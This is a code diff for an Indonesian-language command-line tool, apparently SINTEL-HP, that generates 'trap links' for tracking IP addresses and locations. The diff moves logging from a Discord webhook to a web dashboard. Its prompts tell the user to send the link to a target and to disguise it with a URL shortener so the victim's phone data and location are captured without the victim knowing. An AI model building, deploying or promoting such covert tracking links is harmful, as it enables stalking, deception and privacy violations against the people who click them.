@@ -104,38 +104,29 @@ function handleGetContactGuide() {
 }
 
 async function handleLinkLogger() {
-    console.log('\n' + chalk.bold.bgRed(' REAL IP LOGGER (DISCORD) '));
-    console.log(chalk.yellow('Fitur ini akan membuat link jebakan REAL. Ketika diklik target, lokasi/IP akan dikirim ke Discord lo.'));
+    console.log('\n' + chalk.bold.bgRed(' REAL IP LOGGER & LOCATION TRACKER '));
+    console.log(chalk.yellow('Fitur Tracking IP sekarang udah FULL VERSION pindah ke Dashboard Web. Ga usah pake Discord lagi!'));
+    console.log(chalk.gray('Buka website tool kita di Vercel (contoh: https://sintel.neoma.space) buat ngecek dashboard Real-Timenya langsung jalan di Browser.'));
 
-    const { url, webhook } = await inquirer.prompt([
+    const { url } = await inquirer.prompt([
         {
             type: 'input',
             name: 'url',
-            message: 'Masukkan URL target asli (buat ngalihin target) [misal: https://imgbb.com]:',
-            default: 'https://imgbb.com'
-        },
-        {
-            type: 'input',
-            name: 'webhook',
-            message: 'Masukkan Discord Webhook URL lo (buat nerima log lokasi target):'
+            message: 'Masukkan URL target asli (buat ngalihin targetnya doang) [Biarkan kosong utk google]:',
+            default: 'https://google.com'
         }
     ]);
 
-    if (!webhook || !webhook.includes('discord.com/api/webhooks')) {
-        printError('Webhook tidak valid. Butuh URL Webhook Discord buat nerima notif tracking.');
-        return main();
-    }
-
+    const topicId = 'sintel_' + Math.random().toString(36).substring(2, 10);
     const tBase = Buffer.from(url).toString('base64');
-    const wBase = Buffer.from(webhook).toString('base64');
 
-    // Use the user's Vercel Domain if deployed, otherwise fallback to local/ngrok or just print the relative one
-    const trapLink = `https://sintel.neoma.space/api/trap?t=${tBase}&w=${wBase}`;
+    // Fallback if they run in localhost / CLI without Web
+    const trapLink = `https://sintel.neoma.space/api/trap?topic=${topicId}&t=${tBase}`;
 
     printSuccess('Link Pelacakan Berhasil Dibuat (REAL)!');
-    console.log(`\nLink Jebakan: ${chalk.green.bold.underline(trapLink)}`);
-    console.log(chalk.dim('Kirim link di atas ke penipu. Pas diklik, data HP & lokasinya langsung masuk ke Discord lo!'));
-    console.log(chalk.dim('\nTips: Kalau dirasa terlalu panjang, lu bisa url-shorten link di atas (misal s.id atau bit.ly) biar lebih natural.'));
+    console.log(`\n🕸️ Link Jebakan: ${chalk.green.bold.underline(trapLink)}`);
+    console.log(`⏱️ Cek Hasil Klik Di: ${chalk.blue.underline('Buka Web SINTEL-HP lu di Vercel, masuk ke Menu Live GPS Tracker')}`);
+    console.log(chalk.dim('\nTips: Kalau dirasa mencurigakan, pendekin di bit.ly atau s.id. Selama target buka browser hapenya, lokasi auto-kirim!'));
 
     main();
 }
